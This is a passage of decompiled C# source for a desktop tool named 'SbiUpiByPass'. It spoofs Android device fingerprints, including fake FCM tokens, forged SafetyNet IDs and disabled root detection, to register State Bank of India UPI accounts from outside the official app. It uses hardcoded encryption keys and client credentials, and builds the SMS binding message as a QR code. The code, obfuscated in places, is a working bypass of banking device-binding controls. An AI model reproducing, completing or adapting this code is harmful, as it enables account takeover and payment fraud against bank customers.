#define DEBUG
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.SQLite;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Bunifu.Framework.UI;
using Microsoft.VisualBasic;
using NEXUS.Properties;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Digests;
using Org.BouncyCastle.Crypto.Encodings;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Math;
using Org.BouncyCastle.Security;
using Org.BouncyCastle.X509;
using QRCoder;

namespace APP_FRAMEWORK;

public class SbiUpiByPass : Form
{
	private string response;

	private string string_93;

	private string customerid;

	private string text6;

	private string string_92;

	private WebProxy webProxy_3;

	private CookieContainer cookieContainer_3;

	private int num;

	private string fakeGcmToken;

	private string safety;

	private string string_96;

	private static readonly DateTime Jan1st1970;

	private string string_95;

	private WebException webException_0;

	private string csrfRequestIdentifier;

	private string mobnumber;

	private string otpId;

	private string modelname;

	private string oemdeviceid;

	private string androidid;

	private string simid;

	private static string[] string_0;

	private static Random random_0;

	public static string freeChargeApiHeader;

	private static Random random;

	private string encmob;

	private string cske;

	private string upiact;

	private string smspart;

	public static Assembly ass;

	public static Module _module;

	private string uniquedevice;

	private new string Name;

	public static string listName;

	private string aesSymmetricKey;

	private static int LenghtAesKeyBytes;

	private static RNGCryptoServiceProvider rngCsp;

	protected static char[] hexArray;

	public static string x509CertSecondService;

	public static string packageName;

	private string upiid;

	private string bankcode;

	private string bankName;

	private string accRefNumber;

	private string typea;

	private string maskedAccnumber;

	private string ifsc;

	private string otpLength;

	private string names;

	private string miib;

	private string ki;

	private string upipinn;

	private string atmpinlengh;

	private string dlength;

	private string dLength;

	private string logo;

	private string app_fc;

	private string Path_;

	private bool balanceshow;

	private bool register;

	private static List<string> list;

	private static string logExitFile;

	private WebException webExcep_;

	private string xcrfff;

	private bool Nxtbtn;

	private CookieContainer cookieContainer_2;

	private WebProxy proxy_;

	internal static byte[] key;

	private string bearer;

	private string sbiActGuiddd;

	private string clientsecret;

	private string tokenSecondService;

	private IContainer components;

	private TextBox mobilenumber;

	private Button button1;

	private Button btnNext;

	private Button btnCopy;

	private RichTextBox txtSms;

	private Label label1;

	private Label label2;

	private Label label3;

	private ListBox listBox1;

	private Label label4;

	private Button button2;

	private Button button3;

	private PictureBox pictureBox1;

	private BunifuImageButton btnClose;

	private Panel pnlHeader;

	private Label label5;

	private BunifuImageButton bunifuImageButton1;

	private PictureBox pictureBox2;

	private Label label6;

	private TabControl tabControl1;

	private TabPage tabPage1;

	private TabPage tabPage2;

	private TextBox textBox1;

	public SbiUpiByPass()
	{
		InitializeComponent();
		pnlHeader.MouseDown += StatClass.Header_MouseDown;
		pnlHeader.MouseMove += StatClass.Header_MouseMove;
		pnlHeader.MouseUp += StatClass.Header_MouseUp;
		string text = "Aadesh,Aadi,Aafreen,Aakar,Aalap,Aandaleeb,Aashish,Abeer,Abhay,Abhayananda,Abhayaprada,Abheek,Abhi,Abhibhava,Abhicandra,Abhidi,Abhihita,Abhijat,Abhijaya,Abhijit,Abhijvala,Abhilash,Abhimand,Abhimani,Abhimanyu,Abhimanyusuta,Abhimoda,Abhinabhas,Abhinanda,Abhinandana,Abhinatha,Abhinav,Abhinava,Abhirup,Abhishek,Abhisoka,Abhisumat,Abhisyanta,Abhivira,Abhra,Abhrakasin,Abhyagni,Abhyudaya,Abhyudita,Abjayoni,Abjit,Acalapati,Acalendra,Acalesvara,Acanda,Acarya,Acaryanandana,Acaryasuta,Acaryatanaya,Acchindra,Achal,Achintya,Achyut,Achyuta,Acintya,Acyutaraya,Adalarasu,Adarsh,Adesh,Adhik,Adhikara,Adhipa,Adhita,Adikavi,Adil,Adinath,Adit,Aditeya,Aditya,Adityanandana,Adityavardhana,Adripathi,Adwaita,Adway,Adwaya,Aftab,Aftaab,Agasti,Agastya,Agendra,Agha,Agharna,Aghat,Agneya,Agnikumara,Agniprava,Agrim,Agriya,Ahijit,Ahilan,Ahmad,Ahsan,Aijaz,Aiman,Ainesh,Ajamil,Ajatashatru,Ajay,Ajinkya,Ajit,Ajitabh,Ajitesh,Ajmal,Akalmash,Akalpa,Akash,Akhil,Akhilesh,Akmal,Akram,Akroor,Akshan,Akshar,Akshat,Akshath,Akshay,Akshit,Akul,Alagan,Alagarasu,Alam,Aalam,Alamgir,Alhad,Alok,Aloke,Amal,Amalendu,Amalesh,Amanath,Amanda,Amar,Amartya,Ambar,Ambarish,Ambuj,Ameya,Amil,Amish,Amit,Amitabh,Amitabha,Amitav,Amitava,Amitbikram,Amitesh,Amitiyoti,Amitrasudan,Amiya,Amlankusum,Ammar,Amod,Amogh,Amoha,Amol,Amolik,Amolak,Amrit,Amrit,Amrik,Amulya,Anadi,Anamitra,Anand,Ananda,Anand,Ananga,Anang,Ananmaya,Anant,Ananta,Anant,Anantram,Anarghya,Anbarasu,Anbu,Anbuchelvan,Anbumadi,Angad,Angada,Angamuthu,Anil,Animish,Animesh,Anirudhha,Anirvan,Anisa,Anish,Aniteja,Anjasa,Anjum,Anjuman,Ankit,Ankur,Ankush,Anmol,Anoop,Anshu,Anshul,Anshuman,Anshumat,Anu,Anugya,Anuha,Anuj,Anunay,Anup,Anoop,Anupam,Anurag,Anurag,Anuraag,Anuttam,Anwar,Apoorva,Apparajito,Apurva,Apoorva,Arav,Aravali,Aravan,Archan,Archit,Ardhendu,Arghya,Arham,Arhant,Arihant,Arijit,Arindam,Arivalagan,Arivali,Arivarasu,Arivoli,Arivuchelvan,Arivumadhi,Arjit,Arjun,Arka,Arnav,Arnesh,Arokya,Arshad,Arul,Arulchelvan,Arumugan,Arun,Arun,Aroon,Aruni,Arvind,Arvinda,Arabinda,Arya,Aryaman,Asao,Asav,Asgar,Ashis,Ashok,Ashraf,Ashu,Ashutosh,Ashvin,Ashwatthama,Ashwin,Asvin,Ashwini,Asit,Ashit,Aslesh,Atal,Atanu,Atiya,Atma,Atmaja,Atmajyoti,Atmananda,Atralarasu,Atreya,Atul,Atul,Atulya,Atulya,Avadhesh,Avanindra,Avanish,Avatar,Avikshit,Avinash,Avkash,Ayog,Ayushman,Ayyapan,Badal,Badri,Badrinath,Badriprasad,Bahubali,Bahuleya,Bahumanya,Bahurai,Bajrang,Bakhtawar,Balaaditya,Balachandra,Balachandrav,Baladhi,Baladhitya,Balagovind,Balaji,Balakrishna,Balakumar,Balamani,Balamohan,Balamurugan,Balan,Balanath,Balaraj,Balaram,Balaravi,Balbir,Baldev,Balgopal,Balram,Balvindra, Balvinder,Balwant,Banbihari,Bandhu,Bandhul,Bankebihari,Bankim,Bankimchandra,Bansi,Bansilal,Barid,Baridbaran,Barindra,Barun,Basanta,Basavaraj,Basistha,Basudha,Bhadrak,Bhadraksh,Bhadrang,Bhadranidhi,Bhagaditya,Bhagat,Bhagirat,Bhagirath,Bhagwant,Bhagyanandana,Bhairav,Bhajan,Bhanu,Bhanudas,Bhanuprasad,Bharadwaj,Bharat,Bhargava,Bhargyaraj,Bhaskar,Bhaumik,Bhavamanyu,Bhavesh,Bhim,Bhishma,Bhojaraja,Bhooshan,Bhooshit,Bhudev,Bhumi,Bhupathi,Bhupen,Bhupendra,Bhushan,Bhuvan,Bhuvanesh,Bibek,Bibhas,Bibhavasu,Bijal,Bikram,Bilva,Bimal,Bindusar,Bipin,Birbal,Bitasok,Bodhan,Boudhayan,Brahmabrata,Brahmadutt,Bratindra,Brijesh,Brijmohan,Buddhadev,Buddhadeva,Budhil,Bukka,Chaitanya,Chakor,Chakradev,Chakradhar,Chakrapani,Chakshu,Chaman,Chamanlal,Champak,Chanakya,Chanchal,Chandak,Chandan,Chandra,Chandrabhan,Chandrachur,Chandrahas,Chandrak,Chandrakanta,Chandrakiran,Chandrakirthi,Chandrakishore,Chandrakumar,Chandramohan,Chandran,Chandranath,Chandraprakash,Chandraraj,Chandrashekar,Chandrashekhar,Chandratha,Chandresh,Chandrodaya,Chanyana,Chapal,Charan,Charanjit,Charu,Charudatta,Charudutta,Charuvardhana,Charuvindha,Chaturbhuj,Cheliyan,Chellamani,Chellamuthu,Chellapan,Chemmal,Chetan,Chetana,Chevatkodiyon,Chhandak,Chidambar,Chidambaram,Chidananda,Chiman,Chinmay,Chinmayananda,Chinnadurai,Chintamani,Chintan,Chinthanaichelvan,Chintya,Chirag,Chiranjeev,Chirantan,Chirayu,Chirtrang,Chithayu,Chitrabhanu,Chitragupta,Chitraksh,Chitral,Chitrarath,Chitrasen,Chitresh,Chitta,Chittaprasad,Chittaranjan,Chittaswarup,Chittesh,Chudamani,Dabeet,Daha,Daivya,Daiwik,Daksha,Dakshesh,Dakshi,Dakshina,Dalajit,Dalapathi,Dalbhya,Daman,Damian,Damodar,Danuj,Danvir,Darpak,Darpan,Darshan,Daruka,Dasharath,Dasharathi,Dasmaya,Dattatreya,Dayada,Dayakara,Dayanand,Dayanidhi,Dayasagara,Dayashankar,Debashis,Debashish,Deenabandhu,Deep,Deepak,Deepan,Deepankar,Deependra,Deependu,Deepesh,Deepit,Deeptanshu,Deeptendu,Deeptiman,Deeptimoy,Dev,Dev Kumar,Devabrata,Devachandra,Devadarshan,Devadas,Devadatta,Devadhipa,Devadutt,Devadyumna,Devajyoti,Devak,Devakantha,Devamadana,Devanand,Devang,Devaraj,Devarpana,Devarsi,Devarya,Devdas,Devdutta,Devendra,Devesh,Deveshwar,Devilal,Deviprasad,Devnarayan,Devnath,Devraj,Devya,Dhanajit,Dhananjay,Dhanesh,Dhanraj,Dhansukh,Dhanvant,Dharanidhar,Dharendra,Dharma,Dharmachandra,Dharmadas,Dharmadev,Dharmaditya,Dharmanand,Dharmendra,Dharmendu,Dharmesh,Dharmpal,Dharmveer,Dhaval,Dhavalachandra,Dhawal,Dheeman,Dheemant,Dheer,Dheeran,Dheerendra,Dheivamani,Dhevan,Dhevaneyan,Dhikshit,Dhinakar,Dhinanta,Dhipin,Dhiraj,Dhiren,Dhirendra,Dhritiman,Dhruv,Dhvanya,Dhwani,Dhyana,Dhyanesh,Digamber,Dilawar,Dilip,Dinanath,Dinapati,Dinar,Dindayal,Dinesh,Dinkar,Divakar,Divyanga,Divyendu,Divyesh,Drupad,Dulal,DuraiMurugan,Duranjaya,Durjaya,Dushyanta,Dwaipayan,Dwijaraj,Dwijendra,Dwijesh,Dyumani";
		listName = text;
		string AllAcs = "";
		StartSQLforDatabase(ref AllAcs);
		string text2 = AllAcs;
		string[] array = new string[1];
		string text3 = "$";
		array[0] = text3;
		string[] array2 = text2.Split(array, StringSplitOptions.RemoveEmptyEntries);
		if (array2.Length != 0)
		{
			for (int i = 0; i < array2.Length; i++)
			{
				ListBox.ObjectCollection items = listBox1.Items;
				string text4 = array2[i];
				string text5 = "@sbi";
				items.Add(text4 + text5);
			}
		}
		string text6 = "./BHIM_SBIUPI";
		string path = text6;
		if (Directory.Exists(path))
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			string searchPattern = "*.rg";
			foreach (string item in (from file in directoryInfo.GetFiles(searchPattern)
				select Path.GetFileNameWithoutExtension(file.Name)).ToList())
			{
				string path2 = "BHIM_SBIUPI";
				string text7 = ".rg";
				string path3 = Path.Combine(path2, item + text7);
				string data = File.ReadAllText(path3);
				Encoding uTF = Encoding.UTF8;
				string text8 = "S5Fa}3N]H.L!i]qU0!YD=eqlt{B$S+QKX{r3vFSAs^bihiB1hO";
				string @string = uTF.GetString(LZSS_UP.Decompress(Convert.FromBase64String(Encryption_Up.Decrypt(data, text8)).ToList()).ToArray());
				Encoding uTF2 = Encoding.UTF8;
				string text9 = "S5Fa}3N]H.L!i]qU0!YD=eqlt{B$S+QKX{r3vFSAs^bihiB1hO";
				string string2 = uTF2.GetString(LZSS_UP.Decompress(Convert.FromBase64String(Encryption_Up.Decrypt(data, text9)).ToList()).ToArray());
				string[] array3 = new string[1];
				string text10 = "||##||";
				array3[0] = text10;
				string[] array4 = string2.Split(array3, StringSplitOptions.None);
				Table_Write_Save_RegisInfo(@string, array4[2], array4[5], item);
				File.Delete(path3);
			}
		}
		if (Directory.Exists(path))
		{
			Directory.Delete(path);
		}
	}

	public bool StartSQLforDatabase(ref string AllAcs)
	{
		bool result = true;
		try
		{
			AllAcs = "";
			DataTable dataTable = new DataTable();
			string commandText = "SELECT * FROM [TBL_SBIUPI]";
			new SQLiteDataAdapter(commandText, Class34.string_Database).Fill(dataTable);
			if (dataTable != null && dataTable.Rows.Count > 0)
			{
				IEnumerator enumerator = dataTable.Rows.GetEnumerator();
				while (enumerator.MoveNext())
				{
					DataRow dataRow = (DataRow)enumerator.Current;
					string columnName = "RID";
					string text = dataRow[columnName].ToString();
					string columnName2 = "MobNo";
					string text2 = dataRow[columnName2].ToString();
					if (AllAcs.Contains(text2))
					{
						string text3 = "DELETE from TBL_UPI where RID = '";
						string text4 = "'";
						string query = text3 + text + text4;
						ExecuteQuery(query);
					}
					else
					{
						AllAcs += text2;
						string text5 = AllAcs;
						string text6 = "$";
						AllAcs = text5 + text6;
					}
				}
			}
		}
		catch (Exception ex)
		{
			string text7 = ex.Message.ToString();
			string value = "file is encrypted or is not a database";
			if (text7.Contains(value))
			{
				result = false;
			}
			else
			{
				string text8 = ex.Message.ToString();
				string value2 = "unable to open database file";
				if (!text8.Contains(value2))
				{
					string text9 = ex.Message.ToString();
					string value3 = "no such table: TBL_SBIUPI";
					if (text9.Contains(value3))
					{
						SQLiteConnection sQLiteConnection = new SQLiteConnection(Class34.string_Database);
						sQLiteConnection.Open();
						SQLiteCommand sQLiteCommand = new SQLiteCommand(sQLiteConnection);
						try
						{
							string[] array = new string[1];
							string text10 = "CREATE TABLE TBL_SBIUPI(RID integer PRIMARY KEY AUTOINCREMENT, MobNo varchar(15), UPIAdd varchar(15), RegiInfo varchar(50000), LoginInfo varchar(100000), AccInfo varchar(100000), TrnsInfo varchar(100000), SessInfo varchar(100000), TimeStamp varchar(50));";
							array[0] = text10;
							for (int i = 0; i < array.Length; i++)
							{
								sQLiteCommand.CommandText = array[i];
								sQLiteCommand.ExecuteNonQuery();
							}
							sQLiteCommand.Dispose();
						}
						catch
						{
						}
						if (sQLiteConnection.State == ConnectionState.Open)
						{
							sQLiteConnection.Close();
						}
					}
				}
				else
				{
					result = false;
				}
			}
		}
		return result;
	}

	private void button1_Click(object sender, EventArgs e)
	{
		if (mobilenumber.Text.Length != 10)
		{
			string text = "Enter Valid mobile number without 91 ";
			MessageBox.Show(text);
		}
		else if (textBox1.Text.Length == 6)
		{
			pictureBox1.Visible = false;
			txtSms.Visible = false;
			label1.Visible = false;
			btnNext.Visible = false;
			btnCopy.Visible = false;
			string text2 = "\0";
			string text3 = text2;
			try
			{
				string text4 = "./BHIM_SBIUPI";
				string path = text4;
				if (Directory.Exists(path))
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(path);
					string searchPattern = "*.rg";
					FileInfo[] files = directoryInfo.GetFiles(searchPattern);
					for (int i = 0; i < files.Length; i++)
					{
						string text5 = text3;
						string text6 = ", ";
						text3 = text5 + text6 + files[i].Name;
					}
				}
			}
			catch
			{
			}
			if (text3.Contains(mobilenumber.Text))
			{
				string text7 = "Upi already Bypassed for this Number if you want to rebypass please delete first... ";
				MessageBox.Show(text7);
				return;
			}
			modelname = smethod_0();
			Name = method_1();
			string string_ = "abcdefghijklmnopqrstuvwxyz1234567890";
			oemdeviceid = RandomStrinAg(32, string_);
			string chars = "1234567890";
			string text8 = RandomString(10, chars);
			string text9 = "FTS";
			androidid = sha256(text8 + text9 + text8).ToLower().Substring(0, 16);
			simid = simidd();
			oemdeviceid = Guid.NewGuid().ToString();
			string text10 = oemdeviceid;
			string oldValue = "-";
			oemdeviceid = text10.Replace(oldValue, "");
			string string_2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789";
			uniquedevice = RandomStrinAg(18, string_2);
			num = 15000;
			fakeGcmToken = GetRandomGCMToken();
			string text11 = "SBI239AB591680946F2BB8C432363E3E8F1";
			safety = text11;
			string newValue = appgenid();
			string text12 = "https://upionline.sbi/upi/oauth2ClientHandshake";
			string_93 = text12;
			string text13 = "{\"key_data\":{\"keyId\":\"16\"},\"pspId\":\"201\",\"requestMsg\":\"requestmsgiddd\"}";
			string text14 = text13;
			string text15 = "{\"OTPID\":\"\",\"appVersionCode\":0,\"deviceInfo\":{\"androidId\":\"047c4b14f7bc5b3f\",\"appGenId\":\"75537B6FA0A84667AA4506329277E518\",\"appName\":\"com.sbi.upi\",\"appVersionCode\":\"234\",\"appVersionName\":\"2.3.47\",\"bluetoothMac\":\"NA\",\"capability\":\"5200000200010004000639292929292\",\"deviceAnalytics\":{\"androidApiLevel\":30,\"androidId\":\"047c4b14f7bc5b3f\",\"androidOSName\":\"R\",\"brand\":\"OnePlus\",\"carrierNameOne\":\"vodafone\",\"carrierNameTwo\":\"vodafone\",\"locale\":\"English\",\"model\":\"OnePlus 7TPro\",\"ramSize\":\"7.3 GB\",\"screenDensity\":\"XXXHDPI\",\"screenSize\":\"6.6\"},\"deviceId\":\"047c4b14f7bc5b3f\",\"deviceType\":\"MOB\",\"fcmToken\":\"Io2qNgq5G29D5ARvcv0JBc:APA91bFiKXGPoJECJ7tm_9KVBA2ioVU2WpXByphrhgdW_oB-OmD6vH7BLqWZJ1r8ewzfkbe5bw_DZAyu0wl1uaN-mhsUrAcVVrI7MfaNLRok8qQeHJvy8T5tWGzV58wCOanPI8NlfAkn\",\"geoCode\":\"19.0911 ,72.9208\",\"ip\":\"127.0.0.1\",\"location\":\"Mumbai\",\"mobileNo\":\"9140903684\",\"os\":\"Android11\",\"regId\":\"NA\",\"relayButton\":\"gQ75MtbopujDiyGZ/oONqRqq/sg\\u003d\",\"safetyNetId\":\"SBI239AB591680946F2BB8C432363E3E8F1\",\"selectedSimSlot\":0,\"simId\":\"77210885c3692751b\",\"smsSentTime\":\"\",\"wifiMac\":\"02:00:00:00:00:00\"},\"recoveryOptionFlag\":0,\"requestInfo\":{\"pspId\":\"201\",\"pspRefNo\":\"SBI4BC62A50011241539CA2586EE2630951\"},\"root_beer_count\":0,\"smsSent\":false,\"updateFlag\":0}";
			string oldValue2 = "047c4b14f7bc5b3f";
			string text16 = text15.Replace(oldValue2, androidid);
			string oldValue3 = "Io2qNgq5G29D5ARvcv0JBc:APA91bFiKXGPoJECJ7tm_9KVBA2ioVU2WpXByphrhgdW_oB-OmD6vH7BLqWZJ1r8ewzfkbe5bw_DZAyu0wl1uaN-mhsUrAcVVrI7MfaNLRok8qQeHJvy8T5tWGzV58wCOanPI8NlfAkn";
			string text17 = text16.Replace(oldValue3, fakeGcmToken);
			string oldValue4 = "77210885c3692751b";
			string text18 = text17.Replace(oldValue4, simid);
			string oldValue5 = "SBID8376CFE95654B7AAE0DAD689F89BD9A";
			string text19 = text18.Replace(oldValue5, getsafetyid());
			string oldValue6 = "9140903684";
			string text20 = text19.Replace(oldValue6, mobilenumber.Text);
			string oldValue7 = "75537B6FA0A84667AA4506329277E518";
			string text21 = text20.Replace(oldValue7, newValue);
			string hex = "A6E969A6AFF28488FEB1B3B480BBD6D5C2E9A576357EC83D4633624E5698CD83";
			key = StringToByteArray(hex);
			string text22 = AESGCMEncrypt(text21, key, new byte[12]);
			AESGCMDecrypt(text22, key, new byte[12]);
			string oldValue8 = "requestmsgiddd";
			this.text6 = text14.Replace(oldValue8, text22);
			method_5(string_93, this.text6, string_92, ref webProxy_3, ref cookieContainer_3, bool_2: true, bool_3: true, num, num, ref string_96, ref string_95, ref webException_0);
			string str = string_96;
			string what = "resp";
			string_96 = jsonData_Serial(str, what);
			string_96 = AESGCMDecrypt(string_96, key, new byte[12]);
			string text23 = string_96;
			string value = "Client handshake is successful";
			if (text23.Contains(value))
			{
				string str2 = string_96;
				string what2 = "clientSecret";
				clientsecret = jsonData_Serial(str2, what2);
			}
			string text24 = "https://upionline.sbi/oauth/token";
			string_93 = text24;
			string text25 = "password=149a75cef4dc4ed6b5810debf3df79d7&grant_type=password&client_secret=a8dd71dac92f4ccfaad39411ccf7842c&client_id=0eb6a5ba728b5b89&username=201&";
			string oldValue9 = "a8dd71dac92f4ccfaad39411ccf7842c";
			string text26 = text25.Replace(oldValue9, clientsecret);
			string oldValue10 = "0eb6a5ba728b5b89";
			this.text6 = text26.Replace(oldValue10, androidid);
			string text27 = "password=149a75cef4dc4ed6b5810debf3df79d7&grant_type=password&client_secret=a8dd71dac92f4ccfaad39411ccf7842c&client_id=0eb6a5ba728b5b89&username=201&";
			string oldValue11 = "a8dd71dac92f4ccfaad39411ccf7842c";
			string text28 = text27.Replace(oldValue11, clientsecret);
			string oldValue12 = "0eb6a5ba728b5b89";
			_Request_Sbi(string_87: text28.Replace(oldValue12, androidid), string_86: string_93, string_88: string_92, webProxy_5: webProxy_3, cookieContainer_2: ref cookieContainer_3, bool_63: true, bool_64: true, int_28: num, int_29: num, string_89: ref string_96, string_90: ref string_95, webException_1: ref webException_0);
			string text29 = "Bearer ";
			string text30 = string_96;
			string text31 = string_96;
			string value2 = "access_token";
			bearer = text29 + text30.Substring(text31.IndexOf(value2) + 15, 36);
			string text32 = "https://upionline.sbi/upi/api/check_device_status";
			string_93 = text32;
			string text33 = "{\"check_root_detection\":false,\"requestMsg\":\"msgidddddddd\",\"key_data\":{\"keyId\":\"16\"},\"pspId\":\"201\",\"device_integrity_data\":\"{\\\"appVersionCode\\\":234,\\\"recoveryOptionFlag\\\":0,\\\"root_beer_count\\\":0,\\\"smsSent\\\":false,\\\"updateFlag\\\":0}\"}";
			this.text6 = text33;
			string text34 = "{\"appVersionCode\":0,\"deviceInfo\":{\"androidId\":\"047c4b14f7bc5b3f\",\"appGenId\":\"75537B6FA0A84667AA4506329277E518\",\"appName\":\"com.sbi.upi\",\"appVersionCode\":\"234\",\"appVersionName\":\"2.3.47\",\"bluetoothMac\":\"NA\",\"capability\":\"5200000200010004000639292929292\",\"deviceId\":\"047c4b14f7bc5b3f\",\"deviceType\":\"MOB\",\"fcmToken\":\"Io2qNgq5G29D5ARvcv0JBc:APA91bFiKXGPoJECJ7tm_9KVBA2ioVU2WpXByphrhgdW_oB-OmD6vH7BLqWZJ1r8ewzfkbe5bw_DZAyu0wl1uaN-mhsUrAcVVrI7MfaNLRok8qQeHJvy8T5tWGzV58wCOanPI8NlfAkn\",\"geoCode\":\"19.0911 ,72.9208\",\"ip\":\"127.0.0.1\",\"location\":\"Mumbai\",\"mobileNo\":\"\",\"os\":\"Android11\",\"regId\":\"NA\",\"relayButton\":\"gQ75MtbopujDiyGZ/oONqRqq/sg\\u003d\",\"safetyNetId\":\"SBI239AB591680946F2BB8C432363E3E8F1\",\"selectedSimSlot\":0,\"simId\":\"77210885c3692751b\",\"smsSentTime\":\"\",\"wifiMac\":\"02:00:00:00:00:00\"},\"recoveryOptionFlag\":0,\"requestInfo\":{\"pspId\":\"201\",\"pspRefNo\":\"SBI881D80C05BE943CE8160C69BB2E99A66\"},\"root_beer_count\":0,\"smsSent\":false,\"updateFlag\":0}";
			string oldValue13 = "9140903684";
			string text35 = text34.Replace(oldValue13, mobilenumber.Text);
			string oldValue14 = "047c4b14f7bc5b3f";
			string text36 = text35.Replace(oldValue14, androidid);
			string oldValue15 = "Io2qNgq5G29D5ARvcv0JBc:APA91bFiKXGPoJECJ7tm_9KVBA2ioVU2WpXByphrhgdW_oB-OmD6vH7BLqWZJ1r8ewzfkbe5bw_DZAyu0wl1uaN-mhsUrAcVVrI7MfaNLRok8qQeHJvy8T5tWGzV58wCOanPI8NlfAkn";
			string text37 = text36.Replace(oldValue15, fakeGcmToken);
			string oldValue16 = "77210885c3692751b";
			string text38 = text37.Replace(oldValue16, simid);
			string oldValue17 = "SBI881D80C05BE943CE8160C69BB2E99A66";
			string text39 = text38.Replace(oldValue17, getsafetyid());
			string oldValue18 = "75537B6FA0A84667AA4506329277E518";
			string newValue2 = AESGCMEncrypt(text39.Replace(oldValue18, newValue), key, new byte[12]);
			string text40 = this.text6;
			string oldValue19 = "msgidddddddd";
			this.text6 = text40.Replace(oldValue19, newValue2);
			method_5(string_93, this.text6, string_92, ref webProxy_3, ref cookieContainer_3, bool_2: true, bool_3: true, num, num, ref string_96, ref string_95, ref webException_0);
			string str3 = string_96;
			string what3 = "resp";
			string_96 = jsonData_Serial(str3, what3);
			string_96 = AESGCMDecrypt(string_96, key, new byte[12]);
			string str4 = string_96;
			string what4 = "smsGateWayKey";
			string hex2 = jsonData_Serial(str4, what4);
			string str5 = string_96;
			string what5 = "smsGateWayNo";
			string newValue3 = jsonData_Serial(str5, what5);
			string text41 = Guid.NewGuid().ToString();
			string oldValue20 = "-";
			string inputString = (sbiActGuiddd = text41.Replace(oldValue20, string.Empty).ToUpper());
			string hex3 = sha256(inputString);
			key = StringToByteArray(hex2);
			string text42 = "SBIUPI Confidential:Dont share if asked!";
			string text43 = AESGCMEncrypt(inputString, key, new byte[12]);
			string text44 = "!";
			string text45 = Convert.ToBase64String(StringToByteArray(hex3));
			string oldValue21 = "+";
			string newValue4 = "-";
			string text46 = text45.Replace(oldValue21, newValue4);
			string oldValue22 = "/";
			string newValue5 = "_";
			string text47 = text46.Replace(oldValue22, newValue5);
			string oldValue23 = "=";
			string text48 = text42 + text43 + text44 + text47.Replace(oldValue23, "");
			while (string.IsNullOrEmpty(text48))
			{
			}
			pictureBox1.Visible = true;
			string text49 = "SMSTO:09892010371:";
			string text50 = text49 + text48;
			string oldValue24 = "9892010371";
			string plainText = text50.Replace(oldValue24, newValue3);
			string graphic = new Base64QRCode(new QRCodeGenerator().CreateQrCode(plainText, QRCodeGenerator.ECCLevel.Q)).GetGraphic(20);
			pictureBox1.Image = LoadImage(graphic);
			txtSms.Visible = true;
			label1.Visible = true;
			Label label = label1;
			string text51 = label1.Text;
			string oldValue25 = "07799000980";
			label.Text = text51.Replace(oldValue25, newValue3);
			btnNext.Visible = true;
			btnCopy.Visible = true;
			txtSms.Text = inputString;
		}
		else
		{
			string text52 = "Enter Valid SBI Upi APP 6 DIgit Password \r\n\r\nNote:- Yaha par apko apke sbi upi application ka pin enter karna jo apne registration karte wakt set kiya \r\n\r\nYaha par UPI Payment Pin Enter Na Kare.";
			MessageBox.Show(text52);
		}
	}

	public static string AESGCMEncrypt(string text, byte[] key, byte[] nonce)
	{
		int num = 2108977170;
		int num2 = 188;
		while (num <= 2108978685)
		{
			num = 237 + (338 + num);
		}
		Debug.Assert((0xBD ^ num2) != 0);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		GcmBlockCipher gcmBlockCipher = new GcmBlockCipher(new AesEngine());
		gcmBlockCipher.Init(forEncryption: true, new AeadParameters(new KeyParameter(key), 128, nonce));
		byte[] array = new byte[gcmBlockCipher.GetOutputSize(bytes.Length)];
		gcmBlockCipher.DoFinal(array, gcmBlockCipher.ProcessBytes(bytes, 0, bytes.Length, array, 0));
		return ByteArrayToString(array).ToUpper();
	}

	public static string AESGCMDecrypt(string ciphertext, byte[] key, byte[] nonce)
	{
		byte[] array = StringToByteArray(ciphertext);
		GcmBlockCipher gcmBlockCipher = new GcmBlockCipher(new AesEngine());
		gcmBlockCipher.Init(forEncryption: false, new AeadParameters(new KeyParameter(key), 128, nonce));
		byte[] array2 = new byte[gcmBlockCipher.GetOutputSize(array.Length)];
		gcmBlockCipher.DoFinal(array2, gcmBlockCipher.ProcessBytes(array, 0, array.Length, array2, 0));
		return Encoding.UTF8.GetString(array2);
	}

	public static byte[] StringToByteArray(string hex)
	{
		int num = 466566227;
		int num2 = 715157740;
		while (num <= 466567246)
		{
			num = num + 274 + 259;
		}
		num2 += 301;
		Debug.Assert((0x1BCF407C ^ num) != 0);
		return (from x in Enumerable.Range(0, hex.Length)
			where x % 2 == 0
			select Convert.ToByte(hex.Substring(x, 2), 16)).ToArray();
	}

	public static string ByteArrayToString(byte[] ba)
	{
		StringBuilder stringBuilder = new StringBuilder(ba.Length * 2);
		for (int i = 0; i < ba.Length; i++)
		{
			string format = "{0:x2}";
			stringBuilder.AppendFormat(format, ba[i]);
		}
		return stringBuilder.ToString();
	}

	private static string sha256(string inputString)
	{
		SHA256Managed sHA256Managed = new SHA256Managed();
		StringBuilder stringBuilder = new StringBuilder();
		byte[] array = sHA256Managed.ComputeHash(Encoding.UTF8.GetBytes(inputString));
		byte[] array2 = array;
		foreach (byte b in array2)
		{
			string text = "X2";
			stringBuilder.Append(b.ToString(text));
		}
		return stringBuilder.ToString();
	}

	public static string GetRandomGCMToken()
	{
		string chars = "qazwsxedcrfvtgbyhnujmikolpQAZWSXEDCRFVTGBYHNUJMIKOLP0123456789";
		string text = RandomString(22, chars);
		string text2 = ":APA91bFiKXGPoJECJ7tm_9KVBA2ioVU2WpXByphrhgdW_oB-OmD6vH7BLqWZJ1r8ewzfkbe5bw_DZAyu0wl1uaN-";
		string chars2 = "qazwsxedcrfvtgbyhnujmikolpQAZWSXEDCRFVTGBYHNUJMIKOLP0123456789";
		return text + text2 + RandomString(52, chars2);
	}

	public static string getsafetyid()
	{
		int num = 1401325777;
		int num2 = 1640513734;
		while (num <= 1401327197)
		{
			num = 207 + (220 + num);
		}
		Debug.Assert(-1640513733 + num2 != 0);
		string text = "SBI";
		string text2 = Guid.NewGuid().ToString();
		string oldValue = "-";
		return text + text2.Replace(oldValue, string.Empty).ToUpper();
	}

	public static string appgenid()
	{
		string text = Guid.NewGuid().ToString();
		string oldValue = "-";
		return text.Replace(oldValue, string.Empty).ToUpper();
	}

	public static string md5(string inputString)
	{
